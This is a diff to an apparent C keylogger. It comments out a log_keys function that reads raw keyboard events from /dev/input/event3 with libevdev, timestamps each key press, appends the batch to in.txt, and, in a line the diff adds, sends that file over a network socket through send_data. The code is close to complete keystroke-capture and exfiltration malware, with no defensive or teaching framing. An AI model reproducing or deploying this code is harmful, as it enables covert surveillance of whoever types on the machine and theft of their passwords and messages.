@@ -147,10 +147,10 @@ FILE* get_socket_file(int client_socket) {
   return socket_file;
 }
 
-int send_data(FILE* socket_file) {
+int send_data(FILE* socket_file, FILE* in_file) {
   char* send_line = NULL;
   size_t send_line_size = 0;
-  if (getline(&send_line, &send_line_size, stdin) == -1) {
+  if (getline(&send_line, &send_line_size, in_file) == -1) {
     return -1;
   }
   // If we can't send the line on the socket, the connection is broken and we
@@ -193,96 +193,102 @@ int serialize(FILE* socket_file, key_package* packet) {
   return bytes_sent;
 }
 
-void log_keys(key_package* package) {
-  // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
-  int timer_counter = 200000000;  // 20000000
+// int log_keys(FILE* socket_file, key_package* package) {
+//   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
+//   int timer_counter = 200000000;  // 20000000
 
-  // open a device, as libevdev expects a file descriptor. You should have root
-  // permissions
-  struct libevdev* keyboard_dev;
-  int rc;
+//   // open a device, as libevdev expects a file descriptor. You should have
+//   root
+//   // permissions
+//   struct libevdev* keyboard_dev;
+//   int rc;
 
-  // get keyboard inputs event file
-  int keyboard_fd = open("/dev/input/event3", O_RDONLY | O_NONBLOCK);
-  if (keyboard_fd < 0) {
-    fprintf(stderr, "Error opening event3 file: %d %s\n", errno,
-            strerror(errno));
-    exit(0);
-  }
-  rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
-  if (rc < 0) {
-    fprintf(stderr, "Error with setting rc: %d %s\n", -rc, strerror(-rc));
-    exit(0);
-  }
+//   // get keyboard inputs event file
+//   int keyboard_fd = open("/dev/input/event3", O_RDONLY | O_NONBLOCK);
+//   if (keyboard_fd < 0) {
+//     fprintf(stderr, "Error opening event3 file: %d %s\n", errno,
+//             strerror(errno));
+//     exit(0);
+//   }
+//   rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
+//   if (rc < 0) {
+//     fprintf(stderr, "Error with setting rc: %d %s\n", -rc, strerror(-rc));
+//     exit(0);
+//   }
 
-  int counter = 0;
+//   int counter = 0;
 
-  while (1) {
-    ++counter;
-    struct input_event ev;
+//   while (1) {
+//     ++counter;
+//     struct input_event ev;
 
-    // other options: LIBEVDEV_READ_FLAG_NORMAL
-    rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
-    if (rc < 0) {
-      // note that this section runs when no event is occurring, NOT necessarily
-      // when there is an error printf("value of rc: %d\n", rc);
-      if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
-    } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
-      // handle event here
+//     // other options: LIBEVDEV_READ_FLAG_NORMAL
+//     rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
+//     if (rc < 0) {
+//       // note that this section runs when no event is occurring, NOT
+//       necessarily
+//       // when there is an error printf("value of rc: %d\n", rc);
+//       if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
+//     } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
+//       // handle event here
 
-      // each key press/lift generates 3 events: EV_MSC, EV_SYN, and EV_KEY
-      // we only care about EV_KEY, represented by ev.type == 1
-      if (ev.type == 1) {
-        if (ev.value == 1 || ev.value == 2) {
-          // get current time
-          time_t rawtime;
-          struct tm* timeinfo;
-          time(&rawtime);
-          timeinfo = localtime(&rawtime);
+//       // each key press/lift generates 3 events: EV_MSC, EV_SYN, and EV_KEY
+//       // we only care about EV_KEY, represented by ev.type == 1
+//       if (ev.type == 1) {
+//         if (ev.value == 1 || ev.value == 2) {
+//           // get current time
+//           time_t rawtime;
+//           struct tm* timeinfo;
+//           time(&rawtime);
+//           timeinfo = localtime(&rawtime);
 
-          // make key struct, add to key package. do the file writing in another
-          // file
-          key_info pressed_key = {
-              .key = libevdev_event_code_get_name(ev.type, ev.code),
-              .timestamp = asctime(timeinfo)};
+//           // make key struct, add to key package. do the file writing in
+//           another
+//           // file
+//           key_info pressed_key = {
+//               .key = libevdev_event_code_get_name(ev.type, ev.code),
+//               .timestamp = asctime(timeinfo)};
 
-          // append to key_package->keys
-          package->keys[package->keys_arr_size] = pressed_key;
-          package->keys_arr_size++;
+//           // append to key_package->keys
+//           package->keys[package->keys_arr_size] = pressed_key;
+//           package->keys_arr_size++;
 
-          // printf("New key_package array size: %ld\n",
-          // key_package->keys_arr_size);
-        }
-      }
-    } else {
-      printf("Unsure of what is going on here..\n");
-    }
+//           // printf("New key_package array size: %ld\n",
+//           // key_package->keys_arr_size);
+//         }
+//       }
+//     } else {
+//       printf("Unsure of what is going on here..\n");
+//     }
 
-    if (counter == timer_counter) {
-      counter = 0;
-      // read and write and whee
+//     if (counter == timer_counter) {
+//       counter = 0;
+//       // read and write and whee
 
-      FILE* package_log = fopen("in.txt", "a");
-      if (package_log == NULL) {
-        error_and_exit("Couldn't open file");
-      }
-      keys_to_file(package_log, *package);
-      // call send data functoin on package_log
+//       FILE* package_log = fopen("in.txt", "a");
+//       if (package_log == NULL) {
+//         error_and_exit("Couldn't open file");
+//       }
+//       keys_to_file(package_log, *package);
+//       // call send data functoin on package_log
+//       if (send_data(socket_file, package_log) == -1) {
+//         error_and_exit("sending broke");
+//       }
 
-      if (package->keys_arr_size != 0) {
-        reset_structs(package);
-      }
-    }
+//       if (package->keys_arr_size != 0) {
+//         reset_structs(package);
+//       }
+//     }
 
-    if (ev.code == 107) {
-      // if (log_indicator == 0) {
-      printf("\nExiting.\n");
+//     if (ev.code == 107) {
+//       // if (log_indicator == 0) {
+//       printf("\nExiting.\n");
 
-      break;
-    }
-  }
+//       break;
+//     }
+//   }
 
-  // Clean up
-  libevdev_free(keyboard_dev);
-  close(keyboard_fd);
-}
+//   // Clean up
+//   libevdev_free(keyboard_dev);
+//   close(keyboard_fd);
+// }
